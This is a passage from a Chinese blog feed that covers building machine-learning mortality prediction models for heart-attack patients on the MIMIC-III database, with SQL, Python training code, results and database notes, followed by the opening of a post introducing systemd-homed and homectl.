		CHARTEVENTS<span class="token punctuation">.</span><span class="token punctuation">`</span><span class="token keyword">VALUE</span><span class="token punctuation">`</span><span class="token punctuation">,</span>
		CHARTEVENTS<span class="token punctuation">.</span>VALUEUOM<span class="token punctuation">,</span>
		CHARTEVENTS<span class="token punctuation">.</span>ERROR<span class="token punctuation">,</span>
		TIMESTAMPDIFF<span class="token punctuation">(</span> <span class="token keyword">HOUR</span><span class="token punctuation">,</span> T<span class="token punctuation">.</span>INTIME<span class="token punctuation">,</span> CHARTEVENTS<span class="token punctuation">.</span>CHARTTIME <span class="token punctuation">)</span> STAYHOUR 
	<span class="token keyword">FROM</span>
		CHARTEVENTS<span class="token punctuation">,</span>
		A_AKF_DEATH T 
	<span class="token keyword">WHERE</span>
		CHARTEVENTS<span class="token punctuation">.</span>ICUSTAY_ID <span class="token operator">=</span> T<span class="token punctuation">.</span>ICUSTAY_ID 
		<span class="token operator">AND</span> <span class="token punctuation">(</span> CHARTEVENTS<span class="token punctuation">.</span>ITEMID <span class="token operator">=</span> <span class="token number">220546</span> <span class="token operator">OR</span> CHARTEVENTS<span class="token punctuation">.</span>ITEMID <span class="token operator">=</span> <span class="token number">1542</span> <span class="token punctuation">)</span>
	<span class="token keyword">ORDER</span> <span class="token keyword">BY</span>
		CHARTEVENTS<span class="token punctuation">.</span>SUBJECT_ID 
	<span class="token punctuation">)</span> AA
<span class="token keyword">WHERE</span>
	STAYHOUR <span class="token operator">&lt;=</span> <span class="token number">24</span> 
<span class="token keyword">GROUP</span> <span class="token keyword">BY</span>
	SUBJECT_ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>本次选取的急性心肌梗死患者主要特征见下表：</p>
<table>
<thead>
<tr class="header">
<th>特征</th>
<th>字段或ITEMID</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>年龄</td>
<td>PTENETS.DOD和DOB</td>
</tr>
<tr class="even">
<td>性别</td>
<td>PATIENTS.GENDER</td>
</tr>
<tr class="odd">
<td>心率</td>
<td>CHARTEVENTS.ITEMID</td>
</tr>
<tr class="even">
<td>入院类型</td>
<td>ADMISSION_TYPE</td>
</tr>
<tr class="odd">
<td>ICD细分编码</td>
<td>ADMISSION.ICD9_CODE</td>
</tr>
<tr class="even">
<td>最小GCS评分</td>
<td>220739、223901、223900、198</td>
</tr>
<tr class="odd">
<td>排尿量</td>
<td>40055、226559</td>
</tr>
<tr class="even">
<td>PaO2</td>
<td>779、220224</td>
</tr>
<tr class="odd">
<td>白细胞计数WBC</td>
<td>220546、15424、200、1127、861</td>
</tr>
<tr class="even">
<td>体温</td>
<td>676、223762、678、223761</td>
</tr>
<tr class="odd">
<td>血钾浓度</td>
<td>50971</td>
</tr>
<tr class="even">
<td>血钠浓度</td>
<td>50983</td>
</tr>
<tr class="odd">
<td>血胆红素浓度</td>
<td>50885</td>
</tr>
<tr class="even">
<td>是否有血液恶性肿瘤</td>
<td>ICD9_CODE =200XX-208XX</td>
</tr>
<tr class="odd">
<td>收缩压</td>
<td>51、220050</td>
</tr>
<tr class="even">
<td>动脉收缩压</td>
<td>455、220179</td>
</tr>
<tr class="odd">
<td>血清尿素水平</td>
<td>51006</td>
</tr>
</tbody>
</table>
<h3 id="归一化和标准化">归一化和标准化</h3>
<p>为了将患者特征转换成便于机器学习模型输入训练的特征变量的形式，对于MIMIC数据库中患者初次入院24小时中多次测量并记录的化验指标，选取最小值、最大值和平均值作为三个不同的特征。</p>
<p>然后对数字变量进行归一化，把标准差置为1，均值置为零（ICD细分编码之类的虽然是数字，但实际上是一个类别特征，应作为类别特征处理）</p>
<p>对于性别种族等类别特征，进行Onehot编码转换为梯度提升树模型能够接受的类型；以性别为例，将性别为女编码为01，性别为男编码为10。（LightGBM等可以用直方图算法之类的方式直接处理类别特征，不需要该操作）经过上述处理，共筛选并构建出42个急性心肌梗死患者的特征维度。</p>
<h3 id="缺失值填补">缺失值填补</h3>
<p>由于MIMIC数据库中的数据是由两家不同的医院在10年间的ICU重症监护记录整合而成，急性心肌梗死患者的数据存在缺失和不统一的问题。以化验项目血清碳酸氢水平为例，在提取得到的4788份急性心肌梗死患者样本数据中，有4730份血清碳酸氢数据记录是完整的，有58份是缺失的，缺失率1.2%；但是部分检查指标，如收缩压，4788个样本中只有2665份完整数据，缺失率44.3%。</p>
<p>对于SVM等对于缺失值敏感的算法，用均值填补空缺数据的方法；对于缺失值不敏感的决策树类算法（如GBDT）和自带缺失值处理的算法（如XGBoost），将缺失值置为-1。</p>
<p>（缺失率在40%左右的会影响模型的效果，但是收缩压之类的又很重要，不能轻易舍弃）</p>
<figure>
<img src="/morality-prediction/image-20200603192151696.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<h3 id="数据集不平衡的问题">数据集不平衡的问题</h3>
<p>有的疾病可能会有，急性心肌梗死由于死亡率很高，正负样本比例已经超过了1：9，并不是那种极端不平衡的问题。有的疾病死亡率1%左右需要采样等方式构造平衡数据集。</p>
<h2 id="模型训练">模型训练</h2>
<p>直接用的scikit-learn工具包，随便调了调参。决策树类的bsoosting算法表现都还不错，像GBDT啊，XGBoost啊，LightGBM啊。数据量还是有点小了，就没上深度学习那些网络。直接调sklearn的包调一下参：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd
<span class="token comment"># pd.options.mode.chained_assignment = None</span>
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">import</span> lightgbm <span class="token keyword">as</span> lgb


<span class="token keyword">from</span> sklearn <span class="token keyword">import</span> preprocessing
<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>model_selection <span class="token keyword">import</span> train_test_split<span class="token punctuation">,</span>cross_val_score<span class="token punctuation">,</span>cross_val_predict
<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>ensemble <span class="token keyword">import</span> RandomTreesEmbedding<span class="token punctuation">,</span> RandomForestClassifier<span class="token punctuation">,</span> GradientBoostingClassifier
<span class="token comment"># criteria</span>
<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>metrics <span class="token keyword">import</span> accuracy_score<span class="token punctuation">,</span> roc_auc_score<span class="token punctuation">,</span> f1_score<span class="token punctuation">,</span>recall_score<span class="token punctuation">,</span> precision_score<span class="token punctuation">,</span> roc_curve


<span class="token comment"># 加载数据</span>
data <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'./data/train_data_modified.csv'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> data<span class="token punctuation">.</span>sample<span class="token punctuation">(</span>frac<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> random_state<span class="token operator">=</span><span class="token number">42</span><span class="token punctuation">)</span>
data_x <span class="token operator">=</span> data<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token comment"># data_x = data.iloc[:,[1,2,3,4,5,6,7,36]]</span>
lbl <span class="token operator">=</span> preprocessing<span class="token punctuation">.</span>LabelEncoder<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># data_x['M'] = lbl.fit_transform(data_x['M'].astype(str))#将含有字符的类别特征这一列进行转换</span>
<span class="token comment"># data_x['EMERGENCY'] = lbl.fit_transform(data_x['EMERGENCY'].astype(str))#将含有字符的类别特征这一列进行转换</span>
data_y <span class="token operator">=</span> data<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>

<span class="token comment"># 准备一个train/test来构建模型。</span>
x_train<span class="token punctuation">,</span> x_test<span class="token punctuation">,</span> y_train<span class="token punctuation">,</span> y_test <span class="token operator">=</span> train_test_split<span class="token punctuation">(</span>data_x<span class="token punctuation">,</span>
                                                    data_y<span class="token punctuation">,</span> 
                                                    test_size<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">,</span> 
                                                    random_state<span class="token operator">=</span><span class="token number">52</span><span class="token punctuation">,</span>
                                                    <span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>x_train<span class="token punctuation">.</span>shape<span class="token punctuation">,</span> x_test<span class="token punctuation">.</span>shape<span class="token punctuation">,</span> y_train<span class="token punctuation">.</span>shape<span class="token punctuation">,</span> y_test<span class="token punctuation">.</span>shape<span class="token punctuation">)</span>


<span class="token keyword">from</span> xgboost<span class="token punctuation">.</span>sklearn <span class="token keyword">import</span> XGBClassifier
xgb <span class="token operator">=</span> XGBClassifier<span class="token punctuation">(</span>
    n_estimators<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span>
    learning_rate <span class="token operator">=</span><span class="token number">0.09</span><span class="token punctuation">,</span>
    max_depth<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>
    min_child_weight<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>
    gamma<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">,</span>
    subsample<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>
    colsample_bytree<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>
    objective<span class="token operator">=</span> <span class="token string">'binary:logistic'</span><span class="token punctuation">,</span>
    nthread<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">,</span>
    scale_pos_weight<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>
    reg_lambda<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>
    seed<span class="token operator">=</span><span class="token number">27</span><span class="token punctuation">)</span>
<span class="token comment"># xgb = HistGradientBoostingClassifier(learning_rate=0.09)</span>
xgb<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span> y_train<span class="token punctuation">)</span>

y_pred_xgb <span class="token operator">=</span> xgb<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>x_test<span class="token punctuation">)</span>


y_pred_xgb_pr <span class="token operator">=</span> xgb<span class="token punctuation">.</span>predict_proba<span class="token punctuation">(</span>x_test<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>
fpr_xgb<span class="token punctuation">,</span>tpr_xgb<span class="token punctuation">,</span>thresholds  <span class="token operator">=</span> roc_curve<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span>y_pred_xgb_pr<span class="token punctuation">)</span>

<span class="token comment"># y_pred_xgb = y_pred_xgb_pr > 0.5</span>
<span class="token comment"># print(lr.coef_) #W</span>
<span class="token comment"># print(lr.intercept_) #b</span>
<span class="token comment"># 评价指标</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"auc面积:"</span><span class="token punctuation">,</span>roc_auc_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> y_pred_xgb_pr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"精确率:"</span><span class="token punctuation">,</span>precision_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> y_pred_xgb<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"召回率:"</span><span class="token punctuation">,</span>recall_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> y_pred_xgb<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正确率:"</span><span class="token punctuation">,</span>accuracy_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> y_pred_xgb<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"F1值:"</span><span class="token punctuation">,</span>f1_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> y_pred_xgb<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="死亡率预测">死亡率预测</h2>
<h3 id="结果">结果</h3>
<p>表3-3 几种机器学习方法的死亡率预测结果如下表：</p>
<table>
<thead>
<tr class="header">
<th></th>
<th>GBDT</th>
<th>LR</th>
<th>KNN</th>
<th>SVM</th>
<th>XGBoost</th>
<th>LightGBM</th>
<th>NB</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>AUC</td>
<td>0.834</td>
<td>0.780</td>
<td>0.695</td>
<td>0.779</td>
<td>0.851</td>
<td>0.844</td>
<td>0.777</td>
</tr>
<tr class="even">
<td>精确率</td>
<td>0.676</td>
<td>0.618</td>
<td>0.5</td>
<td>0.688</td>
<td>0.690</td>
<td>0.663</td>
<td>0.378</td>
</tr>
<tr class="odd">
<td>召回率</td>
<td>0.320</td>
<td>0.239</td>
<td>0.162</td>
<td>0.155</td>
<td>0.329</td>
<td>0.330</td>
<td>0.479</td>
</tr>
<tr class="even">
<td>准确率</td>
<td>0.879</td>
<td>0.865</td>
<td>0.852</td>
<td>0.864</td>
<td>0.875</td>
<td>0.872</td>
<td>0.806</td>
</tr>
<tr class="odd">
<td>F1 值</td>
<td>0.451</td>
<td>0.345</td>
<td>0.245</td>
<td>0.253</td>
<td>0.443</td>
<td>0.439</td>
<td>0.422</td>
</tr>
</tbody>
</table>
<p>看上去准确率挺高，实际结果不太好，召回率太低了。召回率的意义是真阳性率（True Positive Rate），也就是预测到的死亡患者占所有患者的比例，大概真正死亡的患者只有一半被预测了出来。</p>
<table>
<thead>
<tr class="header">
<th></th>
<th>实际死亡</th>
<th>实际存活</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>预测死亡</td>
<td>真阳性（TP）</td>
<td>假阳性（FP）</td>
</tr>
<tr class="even">
<td>预测存活</td>
<td>假阴性（FN）</td>
<td>真阴性（TN）</td>
</tr>
</tbody>
</table>
<p>由于数据集还是太小，就没有细分搞成多分类的问题预测一下短期（30天）和长期（90天以上）死亡率，数据集大了可以做一下。数据集再大可以做细分，比如STEMI和NSTEMI的细分或者</p>
<h3 id="roc曲线">ROC曲线</h3>
<figure>
<img src="/morality-prediction/image-20200531203632378.png" alt="几种机器学习方法的ROC曲线" /><figcaption aria-hidden="true">几种机器学习方法的ROC曲线</figcaption>
</figure>
<h3 id="特征权重">特征权重</h3>
<p>以GBDT为例，提取训练模型的决策树权重，结果如图3-3所示。由图可知，梯度提升树模型认为最重要的10个指标为当日最小血清碳酸氢水平、平均动脉血二氧化碳分压、平均排尿量、心率范围、最小心率、肌酐、体温范围、当日最大收缩压、当日心率标准差、年龄。</p>
<figure>
<img src="/morality-prediction/image-20200531210528257.png" alt="GBDT的特征权重" /><figcaption aria-hidden="true">GBDT的特征权重</figcaption>
</figure>
<h2 id="其他问题">其他问题</h2>
<p>这个，急性心肌梗死这个直接看心电图或者彩超啥的更好一些，准确率一般不会低于90%。心血管疾病这种做这个预测基本没有太大意义。急性肾衰竭啥的可能更有意义一点</p>
<p>MIMIC数据库里面的数据亚裔很少，放到国内可能不太合适。护理和临床记录方式也差别不小。</p>
<p>这是2001-2012年的数据，近十年来医学水平提高了不少，包括再灌注等手段，死亡率已经下降了，用这批数据预测现在的可能会偏高</p>
<h2 id="补充说明">补充说明</h2>
<h3 id="mimic数据库表格名称及用途">MIMIC数据库表格名称及用途</h3>
<table>
<colgroup>
<col style="width: 20%" />
<col style="width: 53%" />
<col style="width: 26%" />
</colgroup>
<thead>
<tr class="header">
<th>表格名称</th>
<th>表格内容</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>ADMISSIONS（入院表）</td>
<td>提供有关患者的入院信息，由于为病人进行的每次唯一的医院访问都分配了一个唯一的信息<code>HADM_ID</code>，因此ADMISSIONS表可以被认为是<code>HADM_ID</code></td>
<td></td>
</tr>
<tr class="even">
<td>CALLOUT(标注表)</td>
<td>提供患者何时准备好从ICU出院以及患者何时实际从ICU出院的信息</td>
<td></td>
</tr>
<tr class="odd">
<td>caregivers</td>
<td>记录医护人员信息（ID、类型、附加信息）</td>
<td></td>
</tr>
<tr class="even">
<td>chartevents</td>
<td>记录所有病人的图表数据，住院期间的所有症状、体征、精神状态、实验室检查等</td>
<td></td>
</tr>
<tr class="odd">
<td>cptevents</td>
<td>包含当前的程序术语（CPT）代码，这些代码便于为在患者身上执行的操作计费。</td>
<td></td>
</tr>
<tr class="even">
<td>d_cpt</td>
<td>当前程序术语（CPT）代码的高级定义</td>
<td></td>
</tr>
<tr class="odd">
<td>prescriptions（处方）</td>
<td>包含药物相关的订单条目，即处方</td>
<td></td>
</tr>
<tr class="even">
<td>inputevents_cv</td>
<td>患者输入数据（流入患者体内液体信息）</td>
<td>表格来源CareVue ICU数据库。</td>
</tr>
<tr class="odd">
<td>inputeevents_mv</td>
<td>患者输入数据（流入患者体内液体信息）</td>
<td>表格来源Metavision ICU数据库。</td>
</tr>
<tr class="even">
<td>outputevent</td>
<td>患者的输出数据。</td>
<td></td>
</tr>
<tr class="odd">
<td>labevents</td>
<td>包含给定患者的所有实验室测量值，包括患者数据（ITEMID、VALUE）</td>
<td></td>
</tr>
<tr class="even">
<td>d_icd_diagnoses</td>
<td>ICD-9疾病诊断的定义表,对 疾病编码的解释</td>
<td></td>
</tr>
<tr class="odd">
<td>d_icd_procedures</td>
<td>ICD-9治疗程序代码的解释</td>
<td></td>
</tr>
<tr class="even">
<td>d_items</td>
<td>ICU数据库中所有项目的定义表</td>
<td></td>
</tr>
<tr class="odd">
<td>d_labitems</td>
<td>所有实验室测量的定义表（对ITEMID的解释，对应数据类型，关联的LOINC代码）</td>
<td></td>
</tr>
<tr class="even">
<td>datetimeevents</td>
<td>包含所有日期格式的数据</td>
<td></td>
</tr>
<tr class="odd">
<td>diagnoses_icd（诊断表）</td>
<td>包含患者住院期间所有ICD-9诊断</td>
<td></td>
</tr>
<tr class="even">
<td>drgcodes</td>
<td>包含患者的诊断相关组（DRG）代码</td>
<td></td>
</tr>
<tr class="odd">
<td>icustays</td>
<td>患者在ICU内的住院概要（入住或者转出ICU的时间等）</td>
<td></td>
</tr>
<tr class="even">
<td>microbiologyevents</td>
<td>包含微生物学信息，包括进行的测试和敏感性</td>
<td></td>
</tr>
<tr class="odd">
<td>noteevents</td>
<td>包含所有患者注意事项。，主要是不便于数字化的报告</td>
<td></td>
</tr>
<tr class="even">
<td>patients</td>
<td>包含患者的基本信息（性别、出生日期、死亡日期、死亡标志位）</td>
<td></td>
</tr>
<tr class="odd">
<td>procedureevents_mv</td>
<td>包含患者的（治疗）程序</td>
<td></td>
</tr>
<tr class="even">
<td>procedures_icd</td>
<td>包含患者的ICD程序，最值得注意的是ICD-9程序，即诊断程序</td>
<td></td>
</tr>
<tr class="odd">
<td>services</td>
<td>患者被接纳/转移的服务</td>
<td></td>
</tr>
<tr class="even">
<td>transfers</td>
<td>患者整个住院期间的物理位置</td>
<td></td>
</tr>
</tbody>
</table>
<p>注意： 表格主要分为两种，一种是以D开头的，表示该表格为字典，比如d_labitems，表示实验室检查字典，内含每个实验室检查结果的说明；没有以D打头的表格则是记录患者信息的表格，比如labevents则表示患者住院期间的所有实验室检查结果。</p>
<h3 id="mimic数据表中主要字段">MIMIC数据表中主要字段</h3>
<table>
<thead>
<tr class="header">
<th>数据表</th>
<th>字段</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>ADMISSION</td>
<td>SUBJECT_ID</td>
<td>每个患者的唯一标识</td>
</tr>
<tr class="even">
<td>ADMISSION</td>
<td>HADM_ID</td>
<td>患者每次入院的唯一标识</td>
</tr>
<tr class="odd">
<td>ADMISSION</td>
<td>ADMITTIME</td>
<td>入院时间</td>
</tr>
<tr class="even">
<td>ADMISSION</td>
<td>DEATHTIME</td>
<td>死亡时间</td>
</tr>
<tr class="odd">
<td>DIAGNOSES_ICD</td>
<td>ICD9_CODES</td>
<td>患者的ICD-9编码</td>
</tr>
<tr class="even">
<td>ADMISSION</td>
<td>HOSPITAL_EXPIRE_FLAG</td>
<td>是否死亡</td>
</tr>
<tr class="odd">
<td>D_ITEMS</td>
<td>ITEMID</td>
<td>项目编号</td>
</tr>
<tr class="even">
<td>D_ITEMS</td>
<td>LEABEL</td>
<td>项目名称</td>
</tr>
<tr class="odd">
<td>ICUSTAYS</td>
<td>ICUSTAY_ID</td>
<td>每次ICU病房接受病人唯一标识</td>
</tr>
<tr class="even">
<td>LABEVENTS</td>
<td>VALUE</td>
<td>检查项目</td>
</tr>
<tr class="odd">
<td>LABEVENTS</td>
<td>VALUEUOM</td>
<td>ITEM的值 检查项目的单位（如K/uL）</td>
</tr>
<tr class="even">
<td>LABEVENT</td>
<td>FLAG</td>
<td>检查项目是否异常（正常为Null）</td>
</tr>
</tbody>
</table>
<h3 id="急性心肌梗死患者主要特征">急性心肌梗死患者主要特征</h3>
<table>
<thead>
<tr class="header">
<th>特征</th>
<th>字段或ITEMID</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>年龄</td>
<td>PTENETS.DOD和DOB</td>
</tr>
<tr class="even">
<td>性别</td>
<td>PATIENTS.GENDER</td>
</tr>
<tr class="odd">
<td>心率</td>
<td>CHARTEVENTS.ITEMID</td>
</tr>
<tr class="even">
<td>入院类型</td>
<td>ADMISSION_TYPE</td>
</tr>
<tr class="odd">
<td>ICD细分编码</td>
<td>ADMISSION.ICD9_CODE</td>
</tr>
<tr class="even">
<td>最小GCS评分</td>
<td>220739、223901、223900、198</td>
</tr>
<tr class="odd">
<td>排尿量</td>
<td>40055、226559</td>
</tr>
<tr class="even">
<td>PaO2</td>
<td>779、220224</td>
</tr>
<tr class="odd">
<td>白细胞计数WBC</td>
<td>220546、15424、200、1127、861</td>
</tr>
<tr class="even">
<td>体温</td>
<td>676、223762、678、223761</td>
</tr>
<tr class="odd">
<td>血钾浓度</td>
<td>50971</td>
</tr>
<tr class="even">
<td>血钠浓度</td>
<td>50983</td>
</tr>
<tr class="odd">
<td>血胆红素浓度</td>
<td>50885</td>
</tr>
<tr class="even">
<td>是否有血液恶性肿瘤</td>
<td>ICD9_CODE =200XX-208XX</td>
</tr>
<tr class="odd">
<td>收缩压</td>
<td>51、220050</td>
</tr>
<tr class="even">
<td>动脉收缩压</td>
<td>455、220179</td>
</tr>
<tr class="odd">
<td>血清尿素水平</td>
<td>51006</td>
</tr>
</tbody>
</table>
<h3 id="注意事项">注意事项</h3>
<ul>
<li>MIMIC IIII 数据库中用于识别患者身份的字段共有3个：subjects_id，hadm_id和icustay_id。其中subjects_id是患者身份的唯一标识，即一个subject_id只对应一名患者，一名患者也只有一个subject_id。hadm_id是患者每次住院的身份识别号，一个患者可能多次住院，因此一个subjects_id会对应多个hadm_id，但一个hadm_id只能对应一个subject_id。icustay_id表示患者在进入ICU的编号，因为患者一次住院可以多次进入不同的ICU，因此一个icustay_id只能对应一个hadm_id，当然也只能对应一个subject_id，但一个hadm_id可以对应多个icustay_id。在利用 MIMIC III 数据库进行研究时，往往需要运用sql语言对多个数据库进行连接，连接的基础一般就是这三个字段。</li>
<li>患者的临床资料不一定是住ICU期间的临床资料，也可能是住普通病房时的资料。记录患者入院时间的表格为admission，内含三个时间点：admittime，表示患者入院时间；dischartime，表示患者出院时间；deathtime，表示患者院内死亡的时间。如果deathtime为空(null)，则表示患者住院期间未死亡。记录患者进入和离开ICU的表格为icustays，这个表格中有两个时间较为重要，分别是intime和outtime，前者表示进入ICU的时间，后者表示离开ICU的时间。当然，如果患者在ICU死亡，那么dischartime、outtime和deathtime理论上就是同一个时间，但实际上会稍微有些出入，估计是由于录入不及时造成的；</li>
<li>MIMIC III 中的数据来自于两套数据采集系统：carevue和metavision。在icustays表格中，有一个字段叫dbsource，用于标识数据是来源于carevue还是metavision。CareVue记录的是2001至2008年入院的患者资料，Metavision则是2008至2012年期间入院的患者资料。在Metavision中，病人的随访时间最少为90天，在CareVue中，病人的随访时间则至少为4年。换而言之，在进行预后研究时，如果将数据来源限定为CareVue，则可以将随访时间假定为4年，对于4年以后死亡的患者，可以将其在出院后第4年生存状况定义为“存活”。当然，如果患者的死亡状况(DOD_SSN)为空格(null)，也同样可以表明患者在出院后4年仍然存活。</li>
<li>MIMIC数据库中的ICD编码统计方式和国内不太一样，基本都包含并发症，比如一个病人流感入院并死亡，同时患有急性心肌梗死的并发症，那么该病人也算作急性心肌梗死患者。（主要诊断是其他的疾病，但同时患有某疾病并发症，也认为是该疾病患者，统计死亡时也算在里面）</li>
<li>在MIMIC中有一个'ADMISSION_TYPE，其中有3个类别，分别是URGENT，EMERGENCY和ELECTIVE，ELECTIVE是不紧急的，URGENT和EMERGENCY的区别大概是URGENT的紧急程度更高（一般是需要立即采取措施的那种）</li>
</ul>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>MIMIC</tag>
      </tags>
  </entry>
  <entry>
    <title>systemd-homed简介(homectl设置用户、用户组)</title>
    <url>/systemd-homed/</url>
    <content><![CDATA[<p>在2020.3 发布的systemd 245增加了systemd-homed，改变了<code>/home</code>目录的加密和工作方式。用homectl设置用户组，直接加密整个<code>/home</code>目录更方便了，快来当小白鼠吧。 <a id="more"></a></p>
<h2 id="太长不看版">太长不看版</h2>
<h3 id="使用homectl新建用户用户组">使用homectl新建用户、用户组</h3>
<p>首先你的systemd要在245以后，版本较低或使用SysV或者OpenRC、Upstart的玩家请跳过。</p>
<p>更新：systemd-247以后的版本默认采用Btrfs，还加了一个可选的恢复密码（recovery key），你的密钥丢了可以用这个重置</p>
<p>homectl是systemd-homed.service的一个cli工具，用来配置用户组、用户，包括新建、删除、修改权限和密码等。考虑到systemd近乎一统江湖的的市场占有率，可能你们将不得不面对这种方式。</p>
<p>没开启的先开启一下<code>systemd-homed.service</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl <span class="token builtin class-name">enable</span> systemd-homed
systemctl start systemd-homed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>如果你的daemon没启动可能会出现<code>**Operation on home test1 failed: Failed to execute operation: Resource temporarily unavailable**</code></p>
<p>看到下面这样就行了</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">Created symlink &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;dbus-org.freedesktop.home1.service → &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;systemd-homed.service.
Created symlink &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;multi-user.target.wants&#x2F;systemd-homed.service → &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;systemd-homed.service.
